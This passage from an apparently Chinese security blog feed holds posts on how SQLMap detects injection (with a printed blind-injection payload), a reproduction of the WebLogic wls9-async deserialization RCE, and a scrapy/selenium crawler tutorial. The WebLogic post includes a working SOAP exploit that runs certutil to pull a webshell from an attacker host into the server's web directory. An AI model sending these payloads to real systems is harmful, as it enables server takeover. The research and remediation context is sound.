True。</p><p><img src="https://i.loli.net/2019/05/04/5ccd311093db6.png" alt="debug-40.png"></p><p>拆分一下这里的判断逻辑：</p><ol><li>falsePage与truePage是否相等，falsePage使用的payload为cmpPayload、TruePage使用的payload为reqPayload。假设得到结果为A，A为布尔类型；</li><li>获取not kb.nullConnection结果，假设得到结果为B，B为布尔类型；</li><li>判断not(A and B)，假设得到结果为C，C为布尔类型；</li><li>判断trueResult and C，假设得到结果为D，只有trueResult、C同为True。D才能为True，满足条件判断；</li><li>正常情况下B为True，这时候只有falsePage不等于truePage，才能满足条件。</li></ol><p><img src="https://i.loli.net/2019/05/04/5ccd311094d32.png" alt="debug-41.png"></p><p>这时候的判断还是比较简单的判断并不能直接就认为该处存在注入，可以看到终端输出时该处似乎是布尔类型的盲注。</p><p><img src="https://i.loli.net/2019/05/04/5ccd31107da75.png" alt="debug-42.png"></p><p>之后对该注入信息进行赋值存储injection变量中。由于这时候injectable为True，所以会跳出372行的for循环。</p><p><img src="https://i.loli.net/2019/05/04/5ccd311081b0f.png" alt="debug-43.png"></p><h3 id="深度判断"><a href="#深度判断" class="headerlink" title="深度判断"></a>深度判断</h3><p>待定。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>SQLMap整个运行机制：</p><ol><li>获取url、thread、headers等信息存储至变量中；</li><li>网站存活性检测；</li><li>WAF检测&amp;WAF类型识别；</li><li>稳定性检测；</li><li>注入检测。</li></ol><p>SQLMap关键的脚本：</p><ol><li>./lib/core/decorators.py</li><li>./lib/controller/controller.py</li><li>./request/connect.py</li><li>./controller/checks.py</li><li>./lib/core/agent.py</li></ol><p>通过SQLMap机制简单分析，后续在手工注入的时候可以参考SQLMap的判断机制。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLMap原理分析(一)</title>
    <url>/archives/e409b646.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>记得好久以前看过SQLMap的原理分析，但是那时候仅仅只是看过并没有自己去研究。因此，这次想深入研究一下SQLMap的原理。大概会从网络请求、运行流程、源码这些角度进行分析。</p><a id="more"></a><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>先准备几个不同数据库的测试环境：MySQL、Oracle、SQLServer等。这里偷懒就直接用AWVS提供的环境：<a href="http://testphp.vulnweb.com、http://testasp.vulnweb.com。" target="_blank" rel="noopener">http://testphp.vulnweb.com、http://testasp.vulnweb.com。</a></p><h2 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h2><p>SQLMap可以在<a href="http://sqlmap.org" target="_blank" rel="noopener">官方站点</a>下载也可以通过Git命令从GitHub下载。<code>git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></p><p>如果已经有SQLMap，可以更新到最新版本。这里我用的是1.3.4.51#dev版本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py --update</span><br><span class="line">python sqlmap.py --version</span><br></pre></td></tr></table></figure><h1 id="请求分析"><a href="#请求分析" class="headerlink" title="请求分析"></a>请求分析</h1><p>通过对请求分析可以很直观看到SQLMap从开始到结束中间一共进行过什么操作。分析思路为找到SQLMap关键的几个请求包进行分析，得出SQLMap大概的一个操作流程以及判断逻辑。Ps：下文中包的数字等信息并不固定。</p><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>在testphp站点随便找一个注入点，可以发现登录口存在注入，用BurpSuite（代理端口8080）将请求保存成sql.txt，然后使用sqlmap进行注入。</p><p><code>python sqlmap.py -r sql.txt -p uname --proxy http://127.0.0.1:8080</code></p><p>正常情况下这时候已经可以在BurpSuite的proxy-history里面看到sqlmap发的请求了。</p><p>首先会不直接按照sql.txt中的请求包发起一次请求根据响应进行下一步操作，由于该处登录口登录失败会进行302跳转。因此，SQLMap会有一个是否跟进302的提示。</p><p><img src="https://i.loli.net/2019/05/02/5cca7633abca2.png" alt="302跳转.png"></p><p>接下来可以看到SQLMap猜测该处为MySQL数据库，大概为第五、六个包。</p><ol><li>按照sql.txt发起请求；</li><li>在url后面加参数发起请求；</li><li>将POST请求变成GET请求；</li><li>不改动再发起一次请求；</li><li>增加特殊字符发起请求：&lsquo;、&quot;。</li></ol><p>根据服务器回显报错得出可能为MySQL数据库。</p><p><img src="https://i.loli.net/2019/05/02/5cca763844613.png" alt="MySQL_Error.png"></p><p>接下来会猜测注入类型型，大概在第一百四十六个包会得出注入点uname为布尔盲注，根据请求可以看到payload。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname=est' AND (<span class="keyword">SELECT</span> <span class="number">2</span>*(<span class="keyword">IF</span>((<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="number">0x71627a7671</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>(<span class="number">4376</span>=<span class="number">4376</span>,<span class="number">1</span>))),<span class="number">0x71766b6271</span>,<span class="number">0x78</span>))s), <span class="number">8446744073709551610</span>, <span class="number">8446744073709551610</span>)))<span class="comment">-- GUJT</span></span><br></pre></td></tr></table></figure><p>判断依据为该请求服务器可以正常响应。</p><p>接下来会对数据库版本以及函数进行猜测，大概在二百二十七个包会得出可以使用union以及共有8个字段。</p><p><img src="https://i.loli.net/2019/05/02/5cca7638a50b9.png" alt="union.png"></p><p>最后对进行一次验证，并得出结论。</p><p><img src="https://i.loli.net/2019/05/02/5cca7638ab833.png" alt="result.png"></p><h2 id="SQLServer"><a href="#SQLServer" class="headerlink" title="SQLServer"></a>SQLServer</h2><p>随便找一个注入点：<a href="http://testasp.vulnweb.com/showforum.asp?id=0，将流量代理到BurpSuite。" target="_blank" rel="noopener">http://testasp.vulnweb.com/showforum.asp?id=0，将流量代理到BurpSuite。</a></p><p>SQLMap第一次认为该处不存在注入，可以看到是输入特殊的字符根据响应进行判断：&lsquo;、&quot;。一共发起两次特殊字符请求进行注入点判断，服务器响应为500，并且响应包里面没有带数据库报错等信息。因此，SQLMap猜测该处并不存在注入。</p><p><img src="https://i.loli.net/2019/05/02/5cca76386163a.png" alt="SQLServer_error.png"></p><p>但是后来SQLMap发现该处为布尔类型的盲注，根据时间来看是11:59:59时判断的。根据BurpSuite的时间戳找到这个时间点的请求包得知payload：0 and 9756=9756，并且服务器的响应为200。</p><p><img src="https://i.loli.net/2019/05/02/5cca7638a5110.png" alt="and.png"></p><p>接下来SQLMap判断该数据库类型为SQLServer，根据前后的请求包来看应该是按照不同连接符号得出的不同结论来进行判断。</p><p>可以看到一共用了三种连接符号，在使用||，服务器返回为200响应码。</p><ol><li>||</li><li>+</li><li>&amp;</li></ol><p><img src="https://i.loli.net/2019/05/02/5cca7635c7197.png" alt="||code=200.png"></p><p>接下来会开始猜测注入类型，会得出该注入点是SQLServer可注入，并且是什么类型注入。</p><p><img src="https://i.loli.net/2019/05/02/5cca76386452f.png" alt="注入类型.png"></p><p>接着通过order by来猜测字段长度，可得出长度为2。</p><p><img src="https://i.loli.net/2019/05/02/5cca76385c3f5.png" alt="order by 2.png"></p><p>最终会输出结果。</p><p><img src="https://i.loli.net/2019/05/02/5cca763398e71.png" alt="sqlserver-result.png"></p><h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><p>待测试。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>根据上面的测试可以得知SQLMap大致工作流程：数据库类型猜测、注入类型猜测、数据库版本猜测（MySQL不同版本会影响后续payload选择）、字段长度猜测、结论输出等。</p><ol><li>数据库类型猜测使用特殊字符来完成：单引号、双引号、连接符等；</li><li>注入类型猜测通过函数来完成：char、union、concat、select等；</li><li>长度猜测用的是order by。</li></ol><p>这次测试注入点都是简单的注入点，因此看起来很类似。或许在复杂的注入点中间用的函数或者特殊字符不同，但是流程上应该是保持不变的。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogic wls9-async rce复现&amp;分析</title>
    <url>/archives/94f70d04.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>针对Weblogic wls9-async反序列化进行漏洞环境搭建及复现。</p><p><img src="https://i.loli.net/2019/04/25/5cc10d1a6ddfd.png" alt="success.png"></p><p><img src="https://i.loli.net/2019/04/25/5cc10d1f59bf8.png" alt="webshell"></p><a id="more"></a><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>服务器需要安装jdk,这里采用1.7版本。</p><p>在<a href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-main-097127.html" target="_blank" rel="noopener">Oracle官网</a>下载对应版本,这里使用的12.1.3(10.x版本也可以的)。</p><p><a href="https://i.loli.net/2019/04/25/5cc10e75259ba.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/04/25/5cc10e75259ba.png" alt="oracle-download.png"></a></p><p>下载完成之后，通过<code>java -jar fmw_12.1.3.0.0_wls.jar</code>启动安装程序，默认安装即可。安装完成之后启动weblogic。</p><p><a href="https://i.loli.net/2019/04/25/5cc10f794723e.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/04/25/5cc10f794723e.png" alt="weblogic-start.png"></a></p><p>通过浏览器访问查看服务是否启动。</p><p><a href="https://i.loli.net/2019/04/25/5cc10fb8dade5.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/04/25/5cc10fb8dade5.png" alt="weblogic-bro.png"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>在攻击机上通过python启动一个web服务，该目录下放一个webshell。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span> <span class="comment"># python2</span></span><br><span class="line">python3 -m http.server <span class="comment"># python3</span></span><br></pre></td></tr></table></figure><p>由于是soap，先访问一下<a href="http://ip:port/_async/AsyncResponseService?WSDL">http://ip:port/_async/AsyncResponseService?WSDL</a> ，看下格式结构。</p><p><a href="https://i.loli.net/2019/04/25/5cc1105a91737.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/04/25/5cc1105a91737.png" alt="weblogic-wsdl.png"></a></p><p>通过SOAP-UI进行请求构建，新建一个soap，在Initial WSDL输入刚刚的url。</p><p><a href="https://i.loli.net/2019/04/25/5cc110c956692.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/04/25/5cc110c956692.png" alt="weblogic-soap.png"></a></p><p>新建一个request请求。</p><p><a href="https://i.loli.net/2019/04/25/5cc111862585f.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/04/25/5cc111862585f.png" alt="new-requests.png"></a></p><p>将下列代码贴进请求包中，需要注意的是string标签下面的ip、port、webshell.txt这些需要按照自己的环境进行修改。我的攻击机ip为192.168.100.5 port为80 webshell.txt为cmd.txt。</p><p>上传的路径：</p><p>12版本<code>servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3/2ig01a/war/</code></p><p>10版本<code>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/</code>。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:wsa</span>=<span class="string">"http://www.w3.org/2005/08/addressing"</span> <span class="attr">xmlns:asy</span>=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span>   </span><br><span class="line">	<span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">		<span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>certutil -urlcache -split -f http://192.168.100.5/cmd.txt servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3/2ig01a/war/cmd.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p>点击request窗口的发送请求按钮，可以看到攻击机上的python web服务有访问请求，说明文件已经成功上传到服务器上。</p><p><a href="https://i.loli.net/2019/04/25/5cc11477bda21.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/04/25/5cc11477bda21.png" alt="python-httpserver.png"></a></p><p>通过蚁剑或菜刀连接即可。</p><p><img src="https://i.loli.net/2019/04/25/5cc10d1a6ddfd.png" alt="success.png"></p><p><img src="https://i.loli.net/2019/04/25/5cc10d1f59bf8.png" alt="webshell"></p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>使用JD-GUI打开对应War包。</p><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Weblogic9:</span></span><br><span class="line">/%WLS_HOME%<span class="regexp">/weblogic92/server</span><span class="regexp">/lib/bea</span>_wls9_async_response.war</span><br><span class="line"></span><br><span class="line">Weblogic <span class="number">10</span>:</span><br><span class="line">/%WLS_HOME%<span class="regexp">/wlserver_10.3/server</span><span class="regexp">/lib/bea</span>_wls9_async_response.war</span><br><span class="line"></span><br><span class="line"><span class="symbol">Weblogic12:</span></span><br><span class="line">/%WLS_HOME%<span class="regexp">/oracle_common/modules</span><span class="regexp">/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3.war</span></span><br></pre></td></tr></table></figure><p>在web.xml里面可以看到基本都是指向<code>weblogic.wsee.async.AsyncResponseBean</code></p><p><img src="https://i.loli.net/2019/04/25/5cc18b223d1a4.png" alt="web-xml.png"></p><p>跟进<code>weblogic.wsee.async.AsyncResponseBean</code>，可以得知有两个函数handleResult、handleFault。查看<a href="https://docs.oracle.com/middleware/12213/wls/WLAPI/weblogic/wsee/async/AsyncResponseBean.html" target="_blank" rel="noopener">oracle官方</a>对AsyncResponseBean类的描述，查看Method Detail,可以得知handleResult是当异步响应服务收到对请求正常时调用，handleFault是异常时调用。</p><p>根据官方文档可以得知AsyncResponseBean继承AbstractAsyncResponseBean类(<code>%WLS_HOME%/server/lib/weblogic.jar</code>)。在weblogic.wsee.async找到该类。</p><p><img src="https://i.loli.net/2019/04/25/5cc1a3cf32429.png" alt="weblogic-abstractasync.png"></p><p>由于不了解weblogic逻辑处理流程，根据查阅的资料所得：该处会与AddressingHandler、AsyncResponseHandler、WorkAreaHandler有关。</p><p>其中WorkAreaHandler被WorkAreaServerHandler和WorkAreaClientHandler继承，而WorkAreaServerHandler的27行处<code>localWorkContextMapInterceptor.receiveRequest(**new** WorkContextXmlInputAdapter(localWorkAreaHeader.getInputStream()));</code>可以看到接受请求用到了WorkContextXmlInputAdapter。</p><p><img src="https://i.loli.net/2019/04/25/5cc1a9a55c1b0.png" alt="requests.png"></p><p>跟进该类可以发现该类imoprt了XMLDecoder，而且并没有做过滤。XMLDecoder是用来将XML文件反序列化成java对象。</p><p><img src="https://i.loli.net/2019/04/25/5cc1a96f84381.png" alt="XMLDecoder.png"></p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>1.删除对应war包；</p><p>2.禁用bea_wls9_async_response组件。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次分析还有存在疑难点：weblogic整体的逻辑处理流程是如何，这个需要后续是多了解。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-scrapy学习(四)</title>
    <url>/archives/8c2656f.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>scrapy学习到此告一段落，下图为一个项目的框架图。</p><p><img src="https://i.loli.net/2018/12/03/5c04c4f799a40.png" alt="项目框架图"></p><a id="more"></a><p>在学习如何将数据进行存储，接下来学习如何使用selenium解析JS、邮件通知</p><h1 id="selenium解析JS"><a href="#selenium解析JS" class="headerlink" title="selenium解析JS"></a>selenium解析JS</h1><p>在爬取seebug直接请求无法访问到数据页面，发现访问seebug流程为：访问seebug-解析js-赋值cookie字段-再次访问-成功获取数据。</p><p><img src="https://i.loli.net/2018/12/02/5c0367f5396dd.png" alt="js解析"></p><p><img src="https://i.loli.net/2018/12/02/5c0368f0ad668.png" alt="Connect success"></p><p>查阅资料得知scrapy可以使用Splash进行JavaScript渲染，但是根据官网信息显示得与docker进行配合。后面想起来可以通过selenium进行解析，但是<a href="https://github.com/clemfromspace/scrapy-selenium" target="_blank" rel="noopener">scrapy-selenium</a>需要python&gt;=3.6。但是，我使用的是2.7，因此，我直接使用selenium进行解析。Ps：在CentOS6下，无法使用Chrome进行。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>直接使用pip安装selenium即可，phantomjs已经暂停项目，新版的selenium已经不支持phantomjs。报错信息：UserWarning: Selenium support for PhantomJS has been deprecated, please use headless versions of Chrome or Firefox instead。因此，根据<a href="https://selenium-python.readthedocs.io/installation.html#downloading-python-bindings-for-selenium" target="_blank" rel="noopener">官方文档</a>需要下载相应的浏览器内核（Chrome、Edge、Firefox、Safari）。<a href="https://sites.google.com/a/chromium.org/chromedriver/downloads" target="_blank" rel="noopener">我下载了Chrome Driver</a>，并将chromedriver文件移动到/usr/local/bin目录下。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure><h2 id="使用middlewares"><a href="#使用middlewares" class="headerlink" title="使用middlewares"></a>使用middlewares</h2><p>安装完成之后，我想的是通过scary项目的方式进行调用（例如scrapy-selenium），所以并不会采取直接在爬虫里面selenium的调用。通过阅读scrapy文档发现，可以在middleware.py中将selenium使用封装成类，通过setting.py或者爬虫custom_settings进行调用。</p><p>middlewares.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> scrapy.http <span class="keyword">import</span> HtmlResponse</span><br><span class="line"><span class="keyword">from</span> scrapy.exceptions <span class="keyword">import</span> IgnoreRequest</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SeleniumMiddleware</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.chrome_options = Options()</span><br><span class="line">        self.chrome_options.add_argument(<span class="string">'--headless'</span>)</span><br><span class="line">        self.chrome_options.add_argument(<span class="string">'--disable-gpu'</span>)</span><br><span class="line">        self.driver = webdriver.Chrome(chrome_options=self.chrome_options)</span><br><span class="line">        <span class="comment"># self.driver = webdriver.Chrome()</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request, spider)</span>:</span></span><br><span class="line">        self.driver.get(request.url)</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            body = self.driver.page_source</span><br><span class="line">            <span class="keyword">return</span> HtmlResponse(self.driver.current_url, body=body, encoding=<span class="string">'utf-8'</span>, request=request)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># Timeout on WebDriverWait</span></span><br><span class="line">            logging.error(e)</span><br><span class="line">            <span class="keyword">raise</span> IgnoreRequest</span><br></pre></td></tr></table></figure><p>seebug.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zjyd.items <span class="keyword">import</span> ZjydItem</span><br><span class="line"><span class="keyword">from</span> scrapy.utils.project <span class="keyword">import</span> get_project_settings</span><br><span class="line"></span><br><span class="line">settings = get_project_settings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SeebugSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    name = <span class="string">'seebug'</span></span><br><span class="line">    allowed_domains = [<span class="string">'seebug.org'</span>]</span><br><span class="line">    custom_settings = &#123;</span><br><span class="line">        <span class="string">'DOWNLOADER_MIDDLEWARES'</span>: &#123;</span><br><span class="line">            <span class="string">'zjyd.pipelines.SeleniumMiddleware'</span>: <span class="number">723</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_requests</span><span class="params">(self)</span>:</span></span><br><span class="line">        keywords = list(settings[<span class="string">'KEYWORDS'</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> keywords:</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=(<span class="string">'https://www.seebug.org/search/?keywords=%s&amp;category=&amp;page=1'</span> % str(i)), callback=self.parse)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        item = ZjydItem()</span><br><span class="line">        <span class="keyword">if</span> response.xpath(<span class="string">"//table[@class='table sebug-table table-vul-list']/tbody/tr"</span>):</span><br><span class="line">            page = int(response.url[response.url.find(<span class="string">'page='</span>) + <span class="number">5</span>]) + <span class="number">1</span></span><br><span class="line">            next_page = response.url[:response.url.find(<span class="string">'page='</span>) + <span class="number">5</span>] + str(page)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            next_page = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> response.xpath(<span class="string">"//table[@class='table sebug-table table-vul-list']/tbody/tr"</span>):</span><br><span class="line">            <span class="keyword">if</span> i.xpath(<span class="string">"td[@class='text-center datetime hidden-sm hidden-xs']/text()"</span>).extract_first().strip()[:<span class="number">-6</span>] == time.strftime(<span class="string">"%Y-%m-%d"</span>).decode(<span class="string">'utf-8'</span>):</span><br><span class="line">                item[<span class="string">'source'</span>] = <span class="string">'seebug'</span></span><br><span class="line">                item[<span class="string">'title'</span>] = i.xpath(<span class="string">"td[@class='vul-title-wrapper']/a[@class='vul-title']/text()"</span>).extract_first()</span><br><span class="line">                item[<span class="string">'time'</span>] = i.xpath(<span class="string">"td[@class='text-center datetime hidden-sm hidden-xs']/text()"</span>).extract_first().strip()</span><br><span class="line">                item[<span class="string">'url'</span>] = <span class="string">u'https://www.seebug.org'</span> + i.xpath(<span class="string">"td[@class='vul-title-wrapper']/a[@class='vul-title']/href"</span>).extract_first()</span><br><span class="line">                item[<span class="string">'content'</span>] = i.xpath(<span class="string">"td[@class='vul-title-wrapper']/a[@class='vul-title']/text()"</span>).extract_first()</span><br><span class="line">                item[<span class="string">'author'</span>] = <span class="string">u'null'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                next_page = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> item:</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.log(<span class="string">'%s is none!'</span> % (response.url))</span><br><span class="line">        <span class="keyword">if</span> next_page <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            next_page = response.urljoin(next_page)</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(next_page, callback=self.parse)</span><br><span class="line">        self.log(<span class="string">"seebug sprider:%s"</span> % (response.url))</span><br></pre></td></tr></table></figure><p>Or setting.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DOWNLOADER_MIDDLEWARES = &#123;</span><br><span class="line">   <span class="string">'zjyd.middlewares.ZjydDownloaderMiddleware'</span>: <span class="number">543</span>,</span><br><span class="line">    <span class="string">'scrapy.downloadermiddlewares.retry.RetryMiddleware'</span>: <span class="number">90</span>,</span><br><span class="line">    <span class="string">'scrapy_proxies.RandomProxy'</span>: <span class="number">100</span>,</span><br><span class="line">    <span class="string">'scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware'</span>: <span class="number">110</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面的配置就可以将seebug的内容解析出来，并进行数据存储。</p><h1 id="项目整合"><a href="#项目整合" class="headerlink" title="项目整合"></a>项目整合</h1><p>现在项目上有freebuf、seebug等爬虫，通过<code>scrapy list</code>可以查看项目下一共有多少个爬虫。</p><p><img src="https://i.loli.net/2018/12/02/5c0374a60dc98.png" alt="scrapy list"></p><h2 id="爬虫整合"><a href="#爬虫整合" class="headerlink" title="爬虫整合"></a>爬虫整合</h2><p>项目下每个爬虫为一个文件，并非所有爬虫都在一个文件、按照类进行划分。所以需要一个脚本，运行所有的爬虫。通过<a href="https://doc.scrapy.org/en/latest/topics/practices.html?highlight=CrawlerProcess" target="_blank" rel="noopener">官方文档</a>可以看到提供了API接口的方式运行爬虫。这里我采用将所有爬虫通过process.crawl进行运行。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.crawler <span class="keyword">import</span> CrawlerProcess</span><br><span class="line"><span class="comment"># from scrapy import spiderloader</span></span><br><span class="line"><span class="keyword">from</span> scrapy.utils.project <span class="keyword">import</span> get_project_settings</span><br><span class="line"></span><br><span class="line">settings = CrawlerProcess(get_project_settings())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    process = CrawlerProcess(settings)</span><br><span class="line">    process.crawl(<span class="string">'freebuf'</span>, domain=<span class="string">'freebuf.com'</span>)</span><br><span class="line">    process.crawl(<span class="string">'vulbox'</span>, domain=<span class="string">'vulbox.com'</span>)</span><br><span class="line">    process.crawl(<span class="string">'anquanke'</span>, domain=<span class="string">'anquanke.com'</span>)</span><br><span class="line">    process.crawl(<span class="string">'bugbank'</span>, domain=<span class="string">'bugbank.com'</span>)</span><br><span class="line">    process.crawl(<span class="string">'seebug'</span>, domain=<span class="string">'seebug.com'</span>)</span><br><span class="line">    process.crawl(<span class="string">'cnvd'</span>, domain=<span class="string">'cnvd.org.cn'</span>)</span><br><span class="line">    <span class="comment"># spider_loader = spiderloader.SpiderLoader.from_settings(settings)</span></span><br><span class="line">    <span class="comment"># spiders = spider_loader.list()</span></span><br><span class="line">    <span class="comment"># classes = [spider_loader.load(name) for name in spiders]</span></span><br><span class="line">    <span class="comment"># for i in classes:</span></span><br><span class="line">    <span class="comment">#     process.crawl(i)</span></span><br><span class="line">    </span><br><span class="line">    process.start()</span><br></pre></td></tr></table></figure><p>通过上述方法就可以运行项目下的freebuf、vulbox等爬虫。</p><h2 id="邮件通知"><a 